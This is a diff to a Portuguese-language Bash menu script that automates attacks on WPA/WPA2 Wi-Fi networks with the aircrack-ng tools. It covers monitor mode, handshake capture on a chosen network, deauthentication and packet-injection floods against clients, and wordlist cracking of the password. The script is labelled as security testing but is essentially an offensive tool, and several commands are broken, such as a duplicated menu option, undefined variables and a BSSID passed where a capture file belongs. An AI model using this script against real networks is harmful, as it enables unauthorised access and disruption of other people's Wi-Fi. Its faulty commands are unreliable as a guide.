@@ -1,12 +1,14 @@
 #/bin/bash
+#
 # Script para automatizar testes de segurança em redes WPA/WPA2
 # 
 # Data: 19/07/2016 versão 0.1-0
 # Autor: Joao Lucas <joaolucas@linuxmail.org>
+# Github: https://github.com/joao-lucas
 #
 
-INTERFACE=wlan0
-INTERFACE_MON=mon0
+INTERFACE=wlp2s0
+INTERFACE_MON=wlp2s0mon
 DATA=$(date +'%d-%m-%Y-%H-%M')
 ARQ_CAP=arq_$DATA.cap
 WORD_LIST=/home/joao/wpa.txt
@@ -25,8 +27,8 @@ menu(){
 		2) capturar_pacotes ;;
 		3) deauth ;; 
 		3) injetar_pacotes ;;
-		4) quebrar_senha ;;
-		99) echo "Saindo..."; sleep 2; exit 0 ;; 
+		4) TENTAR_quebrar_senha ;;
+		99) echo "Saindo..."; airmon-ng stop $INTERFACE_MON; sleep 2; exit 0 ;; 
 		*) echo "Opção invalida!"; menu ;;
 esac	
 }
@@ -36,10 +38,10 @@ monitoramento(){
 	airmon-ng start $INTERFACE
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ] Modo monitoramento ativo!"
+		echo -e "\n [ OK ] Modo monitoramento ativo!"
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros em ativar modo monitoramento!"
+		echo -e "\n [ FALHA ] Ocorreram erros em ativar modo monitoramento!"
 		echo "~ Verifique se a interface de rede esta correta!"
 		menu
 	fi
@@ -48,15 +50,16 @@ monitoramento(){
 # INICIAR CAPTURA DE PACOTES
 capturar_pacotes(){
 	airodump-ng $INTERFACE_MON
-	echo -e "\n Escolha a rede desejada!"
-	read -p "ESSID: " ESSID
+	echo -e "\n ~ Escolha a rede desejada!"
+	echo -e "[ AVISO ] Anote os dados da rede escolhida, como ESSID, BSSID, CHANNEL e CLIENT"
+        read -p "ESSID: " ESSID
 	read -p "BSSID: " BSSID
 	read -p "CHANNEL: " CHANNEL 
 	echo "Iniciando captura de pacotes na rede $ESSID"
-	airodump-ng --bssid $BSSID --channel $CHANNEL --write $ARQ_CAP
+	airodump-ng --bssid $BSSID --channel $CHANNEL --write $ARQ_CAP $INTERFACE_MON
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
+		echo -e "\n [ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
 		echo "~ Salvando em: $ARQ_CAP"
 		menu	
 	else
@@ -67,8 +70,9 @@ capturar_pacotes(){
 
 # FUNÇAO PARA FAZER DEAUTH
 deauth(){
-	echo "Fazendo DEAUTH"
-	airplay-ng -5 -a $AP -c $CLIENT $INTERFACE_MON --ignore-negative-one 
+	#echo "Fazendo DEAUTH"
+        read -p ""	
+        aireplay-ng -5 -a $AP -c $CLIENT $INTERFACE_MON --ignore-negative-one 
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ] DEAUTH realizado com sucesso!"
@@ -81,7 +85,8 @@ deauth(){
 
 # FUNÇÃO PARA INJETAR PACOTES
 injetar_pacotes(){
-	aireplay-ng -0 50 -a $BSSID -c $CLIENT $MON
+	
+        aireplay-ng -0 50 -a $BSSID -c $CLIENT $INTERFACE_MON
 	if [ $? -eq 0 ]
 	then
 		echo "[ OK ] Pacotes injetados!"
@@ -92,8 +97,7 @@ injetar_pacotes(){
 	fi
 }
 
-quebrar_senha(){
-# quebrar senha
+TENTAR_quebrar_senha(){
 	aircrack-ng $BSSID -w $WORD_LIST 
 	menu
 }
